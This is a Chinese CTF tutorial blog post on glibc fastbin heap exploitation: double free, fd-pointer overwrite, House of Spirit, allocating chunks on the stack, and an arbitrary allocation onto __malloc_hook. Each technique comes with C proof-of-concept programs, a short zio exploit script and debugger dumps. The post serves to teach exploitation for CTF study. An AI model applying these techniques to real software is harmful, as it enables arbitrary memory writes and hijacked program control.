
title: Fastbin Attack

date: 2018-04-04 14:23:45

categories:
- CTF
- Fastbin-Attack
- House-of-Spirit





# 介绍

fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：

- 存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞
- 漏洞发生于 fastbin 类型的 chunk 中

如果细分的话，可以做如下的分类：

- Fastbin Double Free
- House of Spirit
- Alloc to Stack
- Arbitrary Alloc

前两种主要漏洞侧重于利用 `free` 函数释放**真的 chunk 或伪造的 chunk**，然后再次申请 chunk 进行攻击。

后两种侧重于故意修改 `fd` 指针，直接利用 `malloc` 申请指定位置 chunk 进行攻击。



# 0x00 Fastbin Double Free

Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。

## Fastbin Double Free 能够成功利用主要有两部分的原因



1. fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空
2. fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。

```c
/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = "double free or corruption (fasttop)";
        goto errout;
}
//如果free(chunk1) fastbins 中也为 chunk1 会出错。 
```

## 演示

下面的示例程序说明了这一点，当我们试图执行以下代码时

```c
int main(void){
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);
    free(chunk1);
    free(chunk1);
    return 0;
}//如果free(chunk1) fastbins 中也为 chunk1 会出错。 
```

如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。

如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。

```c
int main(void){
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
```

第一次释放`free(chunk1)`

![img](fastbin-attack/fastbin_free_chunk1.png)

第二次释放`free(chunk2)`

![img](fastbin-attack/fastbin_free_chunk2.png)

第三次释放`free(chunk1)`

![img](fastbin-attack/fastbin_free_chunk3.png)

注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 下面这个示例演示了这一点，首先跟前面一样构造 main_arena=>chunk1=>chun2=>chunk1的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin 会把堆块分配到这里。

```c
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;  
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;

    bss_chunk.size=0x21;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);

    chunk_a=malloc(0x10);
    *(long long *)chunk_a=&bss_chunk;
    malloc(0x10);
    malloc(0x10);
    chunk_b=malloc(0x10);
    printf("%p",chunk_b);
    return 0;
}//chunkb 直接可以编辑bss段
```

**值得注意的是，我们在 main 函数的第一步就进行了bss_chunk.size=0x21;的操作，这是因为_int_malloc会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。**

_int_malloc 中的校验如下

```C
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
    {
      errstr = "malloc(): memory corruption (fast)";
    errout:
      malloc_printerr (check_action, errstr, chunk2mem (victim));
      return NULL;
}
```

## 小总结

**通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果( 首先要通过验证 )，这就相当于任意地址写任意值的效果。**



# 0x01 覆盖fd指针实现利用

当一个fastbin堆块存在堆溢出的时候，这种方法就可以使用了。简要的过程就是通过溢出覆盖一个在单链表中的chunk块的fd指针，当再次分配后（至少分配两次），就会在被覆盖的fd处分配fastbin chunk块，从而实现向任意地址分配堆块。

下面详细解释一下：

## 成功利用的条件

- 存在可被溢出的fastbin chunk块，要求可以使chunk块的fd能被控制
- 欲被分配的地址，要求此地址的内容可控(存在size域)

## 如何利用

1. 分配两个fastbin chunk
2. 使用第一个(位于低地址)覆盖第二个(位于高地址)的fd指针。注意，第一个应该是已被分配的，不然就没法写入导致溢出。第二个应该是未被分配的，不然就不存在fd也不存在分配的问题了。
3. **在欲分配的地址，比如bss段上构造一个伪chunk结构**，比如l32(0x0)+l32(41)+l32(0x0)(即前块正在使用中+本块大小为40+fd为0)
4. 进行分配即可得到任意地址分配堆块的效果。从而可以实现任意地址写任意值的效果。

**tips：指向的应为堆头的地址，而不是malloc返回的用户指针的位置（bins指向的是chunk的头部）**

## 演示demo

```c
int BufForTst[100];
int main(int argc, char *argv[]) 
{
    void *buf0,*buf1,*buf2,*buf3;
    BufForTst[1]=0x29;
    buf0 = malloc(32);
    buf1 = malloc(32);
    printf("正常的chunk1、chunk2被分配\n");
    free(buf1);
    printf("chunk2被释放\n");
    printf("break\n");//for debug
    read(0, buf0, 64);//overflow 
    buf2 = malloc(32);
    buf3 = malloc(32);
    printf("发生溢出的chunk2被分配\n%p\n溢出改写的fd地址被分配\n%p\n",buf2,buf3);
    return 0;
}
```

这个例程展示了如何通过覆盖fd指针实现向bss段分配堆块

```c
from zio import *
io=zio('./tst',timeout=9999)
#io.gdb_hint()
io.read_until('break')
sc='a'*32+l32(0x0)+l32(0x29)+l32(0x804A060)
#sc='abcd'
io.writeline(sc)
io.read()
```



# 0x03 House Of Spirit

## 介绍

House of Spirit 是 `the Malloc Maleficarum` 中的一种技术。

该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配**指定地址**的 chunk 的目的。

要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即

- fake chunk 的 ISMMAP 位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
- fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
- fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
- fake chunk 的 next chunk 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem` 。
- fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。

当可以通过某种方式（比如栈溢出）控制free的参数时，就可以使用House of Spirit实现利用。大概的思路是free你要任意分配的地址，然后这个地址就会在再次分配的时候被分配到，但是要任意分配的地址要提起构造好伪chunk结构。

下面详细解释一下：

## 成功利用的条件

- free的参数可控，可以指向欲分配的地址。
- 欲分配的地址要求内容可控，可以提前构造伪chunk

## 如何利用

1. 在欲分配的地址上构造伪chunk。由于堆的检验机制，**要求构造连续的两个伪chunk**。比如l32(0x0)+l32(41)+'aaaa'*8 +l32(0x0)+l32(41)
2. 控制free的参数，指向chunk的地址
3. 再次分配就可以在指定地点分配chunk了

**tips:free的地址为malloc的地址，也就是堆头+8的地址。**

## 演示dome

```c
int TstBuf[100];
int main(int argc, char *argv[])
{
    void *p;
    int i;
    TstBuf[1]=0x29;//为什么是0x29?因为32+8+FLAG位
    TstBuf[11]=0X29;//
    p=malloc(32);
    printf("正常的堆分配：%p\n",p);
    p=(int *)0x804A068;
    free(p);
    printf("free了一个任意地址\n");
    p=malloc(32);
    printf("再次分配堆，可以看到分配到了任意地址上:%p\n",p);
}
```

成功的把堆块分配到了bss上，为了方便我硬编码了，可以根据自己的情况修改。

可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测。



# 0x04 Alloc to Stack

这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。

```c
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;  
} CHUNK,*PCHUNK;

int main(void)
{
    CHUNK stack_chunk;

    void *chunk1;
    void *chunk_a;

    stack_chunk.size=0x21;
    chunk1=malloc(0x10);

    free(chunk1);

    *(long long *)chunk1=&stack_chunk;
    malloc(0x10);
    chunk_a=malloc(0x10);
    return 0;
}
```

## 小总结

通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。



# 0x05 Arbitrary Alloc

介绍

Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如bss、heap、data、stack等等。

## 演示

**在这个例子，我们使用字节错位来实现直接分配 fastbin 到<u>malloc_hook</u>的位置，相当于覆盖_malloc_hook来控制程序流程。**

```c
int main(void){
    void *chunk1;
    void *chunk_a;
    chunk1=malloc(0x60);
    free(chunk1);
    *(long long *)chunk1=0x7ffff7dd1b05;
    malloc(0x60);
    chunk_a=malloc(0x60);
    return 0;
}
```

这里的0x7ffff7dd1b05是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。

```C
0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b10 <__malloc_hook>: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0
```

0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的size域。因为这个程序是 64 位的，因此 fastbin 的范围为32字节到128字节(0x20-0x80)，如下：

```
//这里的size指用户区域，因此要小2倍SIZE_SZ
Fastbins[idx=0, size=0x10] 
Fastbins[idx=1, size=0x20] 
Fastbins[idx=2, size=0x30] 
Fastbins[idx=3, size=0x40] 
Fastbins[idx=4, size=0x50] 
Fastbins[idx=5, size=0x60] 
Fastbins[idx=6, size=0x70] 
```

通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个0x000000000000007f

```
0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0

0x7ffff7dd1af5 <_IO_wide_data_0+309>:   0x000000000000007f
```

因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。

```
##define fastbin_index(sz)                                                      \
    ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
```

而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x00007ffff7dd1b15，因此我们就可以直接控制 **__malloc_hook**的内容。

```
0x4005a8 <main+66>        call   0x400450 <malloc@plt>
 →   0x4005ad <main+71>        mov    QWORD PTR [rbp-0x8], rax

 $rax   : 0x00007ffff7dd1b15 

0x7ffff7dd1b05 <__memalign_hook+5>: 0xfff7a92a0000007f  0x000000000000007f
0x7ffff7dd1b15 <__malloc_hook+5>:   0x0000000000000000  0x0000000000000000
0x7ffff7dd1b25 <main_arena+5>:  0x0000000000000000  0x0000000000000000
0x7ffff7dd1b35 <main_arena+21>: 0x0000000000000000  0x0000000000000000
```



## 小总结

Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。



#  总结

1. **Fastbin Double Free (0x01, 0x02)：**

通过覆盖 fastbins 上的未分配chunk的 FB 使其 malloc 到任意地址

(任意地址需要一个伪造size, 覆盖的地址为伪造chunk的头部。)

2. **House of Spirit 0x03：**

通过free(任意地址) 到fastbins ，然后实现malloc任意地址。

(任意地址需要两个伪造的size，free的地址堆头+8的地址即数据开始的地址)

3. **Alloc to Stack 0x04**

同 Fastbin Double Free (0x01, 0x02) ， 都是覆盖fastbins 中 空闲chunk 的fb 

(任意地址需要一个伪造size, 覆盖的地址为伪造chunk的头部。)



# 参考：

https://ctf-wiki.github.io/ctf-wiki/pwn/heap/fastbin_attack

https://www.cnblogs.com/Ox9A82/p/5865420.html

